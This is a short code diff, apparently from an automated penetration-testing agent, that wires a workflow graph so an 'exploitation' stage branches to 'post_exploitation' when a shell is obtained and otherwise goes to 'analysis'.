+    workflow.add_conditional_edges(
+        "exploitation",
+        should_continue_to_post_exploit,
+        {
+            "post_exploitation": "post_exploitation", # If shell, go here
+            "analysis": "analysis"                  # If no shell, go here
+        }
+    )
+    workflow.add_edge("post_exploitation", "analysis")
     workflow.add_edge("analysis", END)
     
     return workflow.compile()
